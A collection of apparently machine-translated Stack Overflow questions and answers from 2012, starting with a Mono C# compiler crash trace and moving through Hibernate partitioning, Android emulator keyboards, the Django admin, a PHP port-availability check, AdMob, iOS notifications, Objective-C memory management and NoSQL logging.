> 未处理的异常：System.NullReferenceException：对象引用未设置为 Mono.CSharp.EmitContext.Emit 处的对象实例（OpCode 操作码，Mono.CSharp.MethodSpec 方法）[0x00000] 在：0 在 Mono.CSharp.New.Emit （Mono.CSharp.EmitContext ec，IMemoryLocation 目标）[0x00000] 在：0 在 Mono.CSharp.VariableReference.EmitAssign（Mono.CSharp.EmitContext ec，Mono.CSharp.Expression 源，布尔值 leave_copy，布尔值 prepare_for_load）[0x00000] 在:0 在 Mono.CSharp.Assign.Emit (Mono.CSharp.EmitContext ec, Boolean is_statement) [0x00000] 在 :0 在 Mono.CSharp.Assign.EmitStatement (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在Mono.CSharp.BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono。CSharp.Block.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.ExplicitBlock.Emit ( Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Constructor.Emit () [0x00000] 在： 0
> 在 Mono.CSharp.TypeContainer.EmitType () [0x00000] in :0 在 Mono.CSharp.ModuleContainer.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.0 .CSharp.Driver.Compile () [0x00000] in :0 at Mono.CSharp.Driver.Main (System.String[] args) [0x00000] in :0 [ERROR] FATAL UNHANDLED EXCEPTION: System.NullReferenceException: Object reference not在 Mono.CSharp.New.Emit (Mono.CSharp.EmitContext ec, IMemoryLocation 目标的 Mono.CSharp.New.Emit (Mono.CSharp.EmitContext ec, IMemoryLocation target ) [0x00000] 在：0 在 Mono.CSharp.VariableReference.EmitAssign (Mono.CSharp.EmitContext ec，Mono.CSharp.Expression 源，布尔值 leave_copy，布尔值 prepare_for_load) [0x00000] 在：0 在 Mono.CSharp.Assign.Emit （Mono.CSharp。EmitContext ec, Boolean is_statement) [0x00000] 在：0 在 Mono.CSharp.Assign.EmitStatement (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Block.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock .Emit (Mono.CSharp.EmitContext ec) [0x00000] in :0 在 Mono.CSharp.Constructor.Emit () [0x00000] in :0BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.Block.DoEmit (Mono. CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [ 0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Constructor.Emit () [0x00000] 在：0BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.Block.DoEmit (Mono. CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [ 0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Constructor.Emit () [0x00000] 在：00 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp。 Constructor.Emit() [0x00000] in :00 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp。 Constructor.Emit() [0x00000] in :0
> 在 Mono.CSharp.TypeContainer.EmitType () [0x00000] in :0 在 Mono.CSharp.ModuleContainer.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.0 .CSharp.Driver.Compile () [0x00000] in :0 在 Mono.CSharp.Driver.Main (System.String[] args) [0x00000] in :0
> 
> 未处理的异常：System.NullReferenceException：对象引用未设置为 Mono.CSharp.EmitContext.Emit 处的对象实例（OpCode 操作码，Mono.CSharp.MethodSpec 方法）[0x00000] 在：0 在 Mono.CSharp.New.Emit （Mono.CSharp.EmitContext ec，IMemoryLocation 目标）[0x00000] 在：0 在 Mono.CSharp.VariableReference.EmitAssign（Mono.CSharp.EmitContext ec，Mono.CSharp.Expression 源，布尔值 leave_copy，布尔值 prepare_for_load）[0x00000] 在:0 在 Mono.CSharp.Assign.Emit (Mono.CSharp.EmitContext ec, Boolean is_statement) [0x00000] 在 :0 在 Mono.CSharp.Assign.EmitStatement (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在Mono.CSharp.BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono。CSharp.Block.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.ExplicitBlock.Emit ( Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Constructor.Emit () [0x00000] 在： 0
> 在 Mono.CSharp.TypeContainer.EmitType () [0x00000] in :0 在 Mono.CSharp.ModuleContainer.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.0 .CSharp.Driver.Compile () [0x00000] in :0 at Mono.CSharp.Driver.Main (System.String[] args) [0x00000] in :0 [ERROR] FATAL UNHANDLED EXCEPTION: System.NullReferenceException: Object reference not在 Mono.CSharp.New.Emit (Mono.CSharp.EmitContext ec, IMemoryLocation 目标的 Mono.CSharp.New.Emit (Mono.CSharp.EmitContext ec, IMemoryLocation target ) [0x00000] 在：0 在 Mono.CSharp.VariableReference.EmitAssign (Mono.CSharp.EmitContext ec，Mono.CSharp.Expression 源，布尔值 leave_copy，布尔值 prepare_for_load) [0x00000] 在：0 在 Mono.CSharp.Assign.Emit （Mono.CSharp。EmitContext ec, Boolean is_statement) [0x00000] 在：0 在 Mono.CSharp.Assign.EmitStatement (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Block.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock .Emit (Mono.CSharp.EmitContext ec) [0x00000] in :0 在 Mono.CSharp.Constructor.Emit () [0x00000] in :0BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.Block.DoEmit (Mono. CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [ 0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Constructor.Emit () [0x00000] 在：0BlockVariableDeclaration.DoEmit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Statement.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在 :0 在 Mono.CSharp.Block.DoEmit (Mono. CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Block.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [ 0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.Constructor.Emit () [0x00000] 在：00 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp。 Constructor.Emit() [0x00000] in :00 在 Mono.CSharp.ExplicitBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp.ToplevelBlock.Emit (Mono.CSharp.EmitContext ec) [0x00000] 在：0 在 Mono.CSharp。 Constructor.Emit() [0x00000] in :0
> 在 Mono.CSharp.TypeContainer.EmitType () [0x00000] in :0 在 Mono.CSharp.ModuleContainer.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.CSharp.AssemblyDefinition.Emit () [0x00000] 在 Mono.0 .CSharp.Driver.Compile () [0x00000] in :0 at Mono.CSharp.Driver.Main (System.String[] args) [0x00000] in :0 构建完成 -- 1 个错误，0 个警告
> 
> - - - - - - - - - - - 完毕 - - - - - - - - - - -
> 
> 构建：1 个错误，0 个警告

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T16:58:17.130

添加：

```
using System.Runtime.InteropServices; 
```

在文件的开头修复它，`DLLImport`位于该名称空间。不知道为什么编译器不只是抱怨它而不是崩溃。

[此处](https://bugzilla.xamarin.com/show_bug.cgi?id=6529)填写了错误报告。

# hibernate - 休眠 - 在更新之前删除记录并重新插入它们（出于维护目的）

> ID：11955110
> 
> 赞同：0
> 
> 时间：2012-08-14T14:56:39.780
> 
> 标签：hibernate, jakarta-ee, transactions, oracle11g

我们有一个场景，我们需要在更新之前删除记录。在删除时，我们还必须从与外键关联的子表中删除所有记录。我们将不得不重新插入所有更新到父表的记录。

我们想要这样做的原因是将正在更新的记录带到我们 Oracle 数据库中的新分区中。这有助于我们随着时间的推移轻松修剪/删除旧分区，因为它们没有被使用（仅用于维护目的）。

在 Hibernate 中是否有一种简单的方法来实现这一点？我们想对父记录进行级联删除，并将它们与更新（所有父记录和子记录）一起重新插入数据库。有没有人遇到过类似的问题？还有其他更好的解决方案可以将更新的记录拉到新的分区吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T16:50:27.763

我们通过使用基于列名的 Oracle 分区 (Oracle11g) 解决了这个问题。

# .htaccess - 将 htaccess 与 Thrift 一起使用

> ID：11955111
> 
> 赞同：1
> 
> 时间：2012-08-14T14:56:40.170
> 
> 标签：.htaccess, thrift

在域上使用 htaccess 时 Thrift 可以工作吗？

我们的站点与 Thrift 一起使用，但是一旦我们添加 htaccess，站点就不会加载。使用 htaccess 可以很好地加载非 Thrift 代码。所以我假设需要一些特殊的设置来使 Apache Thrift 与 htaccess 一起工作，如果它支持的话。如果是这样，有人可以在这里提供一些关于如何设置的指导。

我在谷歌上也找不到任何信息，因此节俭专家的任何帮助都会很棒。

谢谢。

# android - Android 模拟器在自定义 AVD 皮肤上不接受键盘输入 - SDK 工具 rev 20.0.1

> ID：11955115
> 
> 赞同：6
> 
> 时间：2012-08-14T14:56:43.523
> 
> 标签：android, android-emulator

> **可能重复：**
> [Android 模拟器不接受键盘输入 - SDK 工具 rev 20](https://stackoverflow.com/questions/11235370/android-emulator-doesnt-take-keyboard-input-sdk-tools-rev-20)

对于使用自定义 AVD 皮肤和 SDK 工具 rev 20 的任何人，您如何让键盘访问工作？

Android 模拟器中讨论的解决方案[不采用键盘输入 - SDK 工具 rev 20](https://stackoverflow.com/questions/11235370/android-emulator-doesnt-take-keyboard-input-sdk-tools-rev-20)仅适用于 fugly pixel hogging 默认皮肤 (WVGA800)。

一直在使用“适用于 Nexus S 和 Nexus One 的 Google Android Emulator Skins”：

[http://heikobehrens.net/2011/03/15/android-skins/](http://heikobehrens.net/2011/03/15/android-skins/)

我试图通过添加 hw.keyboard = true 来编辑 AVD config.ini，它仍然不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T14:54:30.833

显然`hardware.ini`，每个皮肤的文件夹（例如`NEXUS-S`）中都有一个文件指定`hw.keyboard=no`. 您可以修改此行以启用基于皮肤的 AVD 中的键盘。`hw.dPad=yes`如果您想使用箭头键，还有。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:03:59.673

从 Eclipse 转到 AVD Mananger。选择特定的 AVD 并单击 Edit 转到 Hardware 部分，单击 New。选择属性名称：键盘支持默认情况下，它的添加值为“no”。只需单击值列并将其更改为“是”。再次单击编辑 AVD。这将在 config.ini 文件中为 AVD 添加一个属性 hw.keyboard=yes。

[Android 模拟器不接受键盘输入 - SDK 工具 rev 20](https://stackoverflow.com/questions/11235370/android-emulator-doesnt-take-keyboard-input-sdk-tools-rev-20)

希望这会有所帮助

# django - django admin中通用内联的“反向编辑”

> ID：11955120
> 
> 赞同：1
> 
> 时间：2012-08-14T14:57:02.370
> 
> 标签：django, admin, reverse, editing, inlines

我有一个 django 模型，命名`Event`为 的通用内联关系`Relationship`，如下所示：

```
# models.py

class Person(models.Model):
    ...

class Role(models.Model):
    ...

class Event(models.Model):
    ...

class Relationship(models.Model):
    person = models.ForeignKey(Person)
    role = models.ForeignKey(Role)
    content_type = models.ForeignKey(ContentType)
    object_id = models.PositiveIntegerField()
    content_object = generic.GenericForeignKey("content_type", "object_id")

# admin.py

class RelationshipInline(generic.GenericTabularInline):
    model = Relationship
    extra = 0

class EventAdmin(admin.ModelAdmin):
    inlines = [RelationshipInline] 
```

我想找到一种方法来编辑内联，不仅可以从事件管理页面，还可以从人员管理页面。到目前为止，我已经添加了以下代码来在人员页面中显示内联

```
class ReverseRelationshipInline(admin.TabularInline):
    model = Relationship

class IndividualAdmin(admin.ModelAdmin):
    inlines = [ReverseRelationshipInline] 
```

但是我得到了表单中`content_type`的`object_id`字段，对于管理员用户来说，它的信息量不是很大，因为它只是对主键的引用。我宁愿解决并显示`content_object`（即使它不可编辑，也可以在列表中知道人们与哪些对象相关）。

有什么方向可以推荐吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T22:36:09.407

您的“ReverseRelationshipInline”必须是 GenericTabularInline，而不是 TabularInline。就这样 ：-）

**更新**

我想我现在明白你在追求什么，我的回答是：

您将无法*编辑*Person 内联的内容对象，但您希望很好地显示它，甚至可以作为其更改表单的链接。

向关系添加一个函数，该函数返回这样一个 HTML 链接，为您的内联提供您自己的 ModelForm 并指定您想要的字段，其中现在包括您的新函数值（只读）。像这样的东西（未经测试）：

```
# models.py

from django.core import urlresolvers

class Relationship(models.Model):
    ...
    def link_content_object_changeform(self):
        obj = self.content_object
        change_url = urlresolvers.reverse(
            'admin:%s_%s_change' % (
                obj._meta.app_label,
                obj._meta.object_name.lower()
            ),
            args=(obj.id,)
        )
        return u'<a href="%s">%s</a>' % (change_url,  obj.__unicode__())
    link_content_object_changeform.allow_tags = True
    link_content_object_changeform.short_description = 'in relation to'

# admin.py

class ReverseRelationshipInlineForm(forms.ModelForm):
    class Meta:
        model = Relationship
        fields = ('person', 'role', 'link_content_object_changeform')
        readonly_fields = ('link_content_object_changeform',)

class ReverseRelationshipInline(admin.TabularInline):
    model = Relationship
    form = ReverseRelationshipInlineForm 
```

# php - 如何判断服务器端口是否可访问？

> ID：11955121
> 
> 赞同：0
> 
> 时间：2012-08-14T14:57:09.703
> 
> 标签：php, html, ping, minecraft

我正在尝试实现一个 PHP 脚本，该脚本将在特定端口上 ping 一个 IP，并回显服务器是否在线/离线。这样，用户将能够查看无法访问服务器是服务器故障还是自身网络问题。

该网站目前位于[http://Dev.stevehamber.com](http://Dev.stevehamber.com)上。您可以看到“在线”包含在“PHP”类中，我需要它来反映服务器是在线还是离线。该应用程序在端口 TCP=25565 上运行，因此我需要输出来显示此端口是否可访问。

这是我发现的（我想）我正在寻找的一个片段：

```
<?php

$host = 'www.example.com';
$up = ping($host);

// if site is up, send them to the site.
if( $up ) {
        header('Location: http://'.$host);
}
// otherwise, take them to another one of our sites and show them a descriptive message
else {
        header('Location: http://www.anothersite.com/some_message');
}

?> 
```

如何在我的页面上复制类似的内容？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T16:42:03.110

根据对该问题的评论，这[`fsockopen()`](http://php.net/manual/en/function.fsockopen.php)是完成此任务的最简单和最广泛可用的方法。

```
<?php

    // Host name or IP to check
    $host = 'www.example.com';

    // Number of seconds to wait for a response from remote host
    $timeout = 2;

    // TCP port to connect to
    $port = 25565;

    // Try and connect
    if ($sock = fsockopen($host, $port, $errNo, $errStr, $timeout)) {
        // Connected successfully
        $up = TRUE;
        fclose($sock); // Drop connection immediately for tidiness
    } else {
        // Connection failed
        $up = FALSE;
    }

    // Display something    
    if ($up) {
        echo "The server at $host:$port is up and running :-D";
    } else {
        echo "I couldn't connect to the server at $host:$port within $timeout seconds :-(<br>\nThe error I got was $errNo: $errStr";
    } 
```

请注意，所有这些都是测试服务器是否接受 TCP:25565 上的连接。它不会做任何事情来验证侦听此端口的应用程序实际上是您正在寻找的应用程序，或者它是否正常运行。

# java - 为什么 getEdgeFlags() 总是返回 0

> ID：11955122
> 
> 赞同：2
> 
> 时间：2012-08-14T14:57:18.767
> 
> 标签：java, android

我想为我的视图检测 onTouchEvent 函数中的触摸边缘，但 getEdgeFlags() 在我的 Nexus S 4.1.1 中总是返回 0，有人可以帮助我吗？提前谢谢。

```
@Override
public boolean onTouchEvent(MotionEvent event) {
    int edgeFlags = event.getEdgeFlags();
    //edgeFlags alway 0!
    switch (edgeFlags) {
    case MotionEvent.EDGE_LEFT:
        Log.i("tag", "EDGE_LEFT");
        break;
    case MotionEvent.EDGE_RIGHT:
        Log.i("tag", "EDGE_RIGHT");
        break;
    case MotionEvent.EDGE_TOP:
        Log.i("tag", "EDGE_TOP");
        break;
    case MotionEvent.EDGE_BOTTOM:
        Log.i("tag", "EDGE_BOTTOM");
        break;
    default:
        Log.i("tag", "" + edgeFlags);
        break;
    }
return super.onTouchEvent(event);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T10:32:40.440

我解决了添加四个按钮触发四个方向的问题！

# android - Admob 在多个活动中添加

> ID：11955123
> 
> 赞同：2
> 
> 时间：2012-08-14T14:57:19.373
> 
> 标签：android, admob

我正在尝试在我的 android 应用程序中添加 Admob，该应用程序包含超过 15 个活动。我的问题是哪个解决方案是最好的，考虑到我不能扩展任何“BaseActivity”（出于各种原因），如本示例所示：[Admob on Multiple Activities？](https://stackoverflow.com/questions/10234762/admob-on-multiple-activities)而且我不想违反任何关于规则制定添加请求及其使用的协议。

到目前为止，我已经创建了一个包含 com.admob.android.ads.AdView 的文件 admob.xml，并且我在每个活动中加载的每个布局“.xml”文件中使用了“包含布局”。

这个可以吗？我会遇到 Google 政策或类似问题吗？或者这种实施是否会导致我失去潜在收入？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T19:59:32.917

这是一个合理的解决方案，并且符合 AdMob 政策。只要确保在同一页面上没有两个横幅。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-09T13:00:12.143

最好的办法是切换到fragment，你的主应用会在main fragment中，而你的广告会在Ad Fragment中。这样你就可以用片段切换你以前的活动，你只需要初始化一次广告片段，这也会在你创建一个新的活动时阻止新的广告请求（这会降低你的 admob RPM）。

伊莱

# iphone - 如何从 iOS 中的警报通知操作启动视图控制器？

> ID：11955124
> 
> 赞同：4
> 
> 时间：2012-08-14T14:57:21.933
> 
> 标签：iphone, ios, uilocalnotification, alarm

在我的应用程序中，我正在使用警报功能。它工作正常。当我单击右键时，它会启动我的应用程序。但我想启动不是 rootViewController 的 View Controller。我尝试在 Google 和 SO 中进行搜索，但我没有任何想法或示例。

我正在寻找任何例子来实现这一点。？

谢谢你们的帮助。

**编辑**

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{     
// Add the view controller's view to the window and display.
[self.window addSubview:alarmViewController.view];
[self.window makeKeyAndVisible];

application.applicationIconBadgeNumber = 0;

// Handle launching from a notification
UILocalNotification *localNotif =
[launchOptions objectForKey:UIApplicationLaunchOptionsLocalNotificationKey];
if (localNotif) {
    NSLog(@"Recieved Notification %@",localNotif);

    window = [[UIApplication sharedApplication] keyWindow];
    UIViewController *rootViewController = [window rootViewController];
    [rootViewController presentModalViewController:receipeViewController animated:YES];         
}

// Override point for customization after application launch.
return YES; 
```

}

```
- (void)application:(UIApplication *)app didReceiveLocalNotification:(UILocalNotification *)notif {
// Handle the notificaton when the app is running
NSLog(@"Recieved Notification %@",notif);   
//Called here as well
window = [[UIApplication sharedApplication] keyWindow];
    UIViewController *rootViewController = [window rootViewController];
    [rootViewController presentModalViewController:receipeViewController animated:YES];   
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T10:36:39.980

最后这是我的做法。

在 didFinishLaunchingWithOptions 中：

```
//save the root view controller
[[self window] makeKeyAndVisible];
UINavigationController *navigationController = (UINavigationController*) self.window.rootViewController;
rootController = [[navigationController viewControllers] objectAtIndex:0]; 
```

应用程序委托中的其他地方：

```
[rootController performSegueWithIdentifier:@"destinationSegue" sender:self]; 
```

然后，在情节提要中，从分配给“rootController”的视图创建一个转场到所需的可选视图，并将该新转场的 ID 设为destinationSegue。需要进行一些调试以确保将 rootController 变量分配给正确的视图。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-23T22:21:37.797

您不需要创建 segue。您只需要在情节提要中为 ViewController 分配一个 id。

```
 [[self window] makeKeyAndVisible];
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Main" bundle:nil];

    LensOverviewViewController *editLensViewController = [storyboard instantiateViewControllerWithIdentifier:@"lensOverView"];
    UINavigationController *yourViewController = [[UINavigationController alloc] initWithRootViewController:editLensViewController];
    [self.window.rootViewController presentViewController:yourViewController animated:NO completion:nil]; 
```

通常 [[self window] makeKeyAndVisible]; 不驻留在 didFinishLaunchingWithOptions 函数中，但需要显式调用它以使 rootviewcontroller 可见。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:11:53.783

```
UIWindow *window = [[UIApplication sharedApplication] keyWindow];
UIViewcontroller *rootViewController = [window rootViewController];
[rootViewController presentModalViewController:alarmViewController animated:YES]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:20:20.407

当您的应用程序启动时，请使用以下方法在 launchOptions 字典中查找 UIApplicationLaunchOptionsLocalNotificationKey：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions 
```

这将让您知道您的应用程序是否由于本地通知（用于警报的通知）而启动。

您还可以在以下位置执行类似操作：

```
- (void)application:(UIApplication *)application didReceiveLocalNotification:(UILocalNotification *)notification 
```

一旦您确定您确实收到了通知，只需从窗口中找到根视图控制器并以模态方式呈现您想要呈现的视图控制器。

# ios - 重新分配指针会导致内存泄漏吗？

> ID：11955127
> 
> 赞同：2
> 
> 时间：2012-08-14T14:57:29.400
> 
> 标签：ios, memory-management, memory-leaks, autorelease

我有以下代码，想知道当 iOS 重新收集分配的内存时会发生什么。p1 指向的内存是否会在之后自动释放，尽管它​​现在指向不同的内存？而且 p2 指向的内存也会被自动释放，因为 p1 在语义上意味着在开始时指向自动释放的内存？

```
NSMutableArray *p1 = [NSMutableArray arrayWithCapacity:10];
NSMutableArray *p2 = [[NSMutableArray alloc] init];

// what will happen to the memory p1 and p2 point to
// after the following assignment, and at later stage?
p1 = p2; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:12:46.617

什么都不会泄露，p1 是一个自动释放的对象，在那种情况下，在你将 p2 分配给 p1 之后，它们都只是指向同一个对象。p1 指向的原始对象由自动释放池管理，当池耗尽时将被释放。ARC与否，假设您稍后发布p2，则不会泄漏。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:22:27.657

```
NSMutableArray *p1 = [NSMutableArray arrayWithCapacity:10];
NSMutableArray *p2 = [[NSMutableArray alloc] init];

// what will happen to the memory p1 and p2 point to
// after the following assignment, and at later stage?
p1 = p2; 
```

“iOS 正在回收分配的内存”——iOS 从来没有垃圾收集功能。

p1 是指向自动释放对象的指针。

p2 是指向非自动释放对象的指针（您或 ARC 必须稍后释放它以避免内存泄漏）

在 p1 = p2 之后，p1 指向 p2 指向的非自动释放对象。p1 指向的原始对象此时是孤立的。

如果您使用 ARC 功能，则无需执行任何操作。在手动内存管理环境下，您执行`[p2 release];`或`[p1 release];` 平衡释放您拥有的已分配对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:29:15.653

顺便说一句，如果您将来有这样的问题，可以通过 (a) 对相关类进行子类化来轻松测试；(b) 添加您自己`dealloc`的记录释放的日志。例如：

```
@interface TestNSMutableArray : NSMutableArray
@end

@implementation TestNSMutableArray
- (void)dealloc
{
    [super dealloc]; // only needed for non-ARC
    NSLog("%s", __FUNCTION__);
}
@end 
```

然后尝试使用`TestNSMutableArray`而不是`NSMutableArray`. 如果你看到你的`dealloc`，你很好。如果没有，那你就泄密了。

显然您也可以使用 Instruments，但是当我第一次接触 Objective-C 内存处理时，我发现这是一种简单但有用的诊断技术。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-14T15:13:10.583

在 ARC 下，你不需要做任何事情 两个对象都会被释放。ARC之外：

```
NSMutableArray *p1 = [NSMutableArray arrayWithCapacity:10]; 
```

返回一个自动释放的值。你不需要释放这个值。然而，这：

```
NSMutableArray *p2 = [[NSMutableArray alloc] init]; 
```

手动保留计数为 1。完成后，您需要释放 p2 的值（然后将其分配给 p1）。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-14T15:03:40.533

首先，这取决于您是否使用 ARC。

使用 ARC：不会有内存泄漏。操作系统将释放 p1 的内存，数组现在将指向与 p2 相同的位置。然后，当 p1 和 p2 消失时（例如当类被释放时），操作系统将释放两个数组的内存。

无 ARC：p1 将被泄露。要修复泄漏，您将需要

```
[p1 release]; 
```

在将 p2 的值分配给 p1 之前。如果在释放类之前没有在这两个数组上调用 release，来自 p2 的内存也将被泄漏。

# logging - 从文件日志迁移到数据库日志

> ID：11955131
> 
> 赞同：2
> 
> 时间：2012-08-14T14:57:37.580
> 
> 标签：logging, nosql

我们目前正在考虑从日志记录转移到文件，到日志记录到 NoSQL 数据库。我们公司的另一个团队开始使用 HBase，但这对于我们想做的事情来说看起来相当复杂。我一直在研究 MongoDB，但我想要一些建议。

目前，我们在场中有数百台服务器用于不同的应用程序。每当我们从其中一个应用程序中听到问题时，都会有一个漫长的过程来从应用程序操作中检索日志，然后需要一个漫长的过程来筛选它们以找出问题所在。我们正在考虑将所有日志转移到一个中心位置并围绕它构建一个 Web UI，以便我们可以更轻松地访问和查询日志。

哪个 NoSQL 数据库适合存储和查询应用程序日志？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T06:21:08.673

我见过很多公司都在使用**MongoDB**来存储应用程序日志。它的模式自由性对于应用程序日志非常灵活，在这种情况下，模式往往会不时改变。此外，它的[Capped Collection](http://docs.mongodb.org/manual/core/capped-collections/)功能非常有用，因为它会自动清除旧数据以保持数据适合内存。

人们通过普通的 Grouping 或 MapReduce 聚合日志，但速度不是那么快。尤其是 MongoDB 的 MapReduce 只能在单线程中工作，而且它的 JavaScript 执行开销很大。[新的聚合框架](http://docs.mongodb.org/manual/applications/aggregation/)可以解决这个问题。

当您使用 MongoDB 进行日志记录时，需要注意的是高写入吞吐量导致的**锁争用。**虽然 MongoDB 的插入默认是即发即弃的风格，但调用大量的 insert() 会导致严重的写锁争用。这可能会影响应用程序性能，并阻止阅读器聚合/过滤存储的日志。

一种解决方案可能是使用**日志收集器框架**，例如[Fluentd](http://fluentd.org/)、[Logstash](http://logstash.net/)或[Flume](http://flume.apache.org/)。这些守护进程应该在每个应用程序节点上启动，并从应用程序进程中获取日志。

它们缓冲日志并将数据**异步**写入其他系统，如 MongoDB / PostgreSQL / 等。写入是通过**批处理**完成的，因此比直接从应用程序写入要高效得多。此链接描述了如何将日志从 PHP 程序放入 Fluentd。

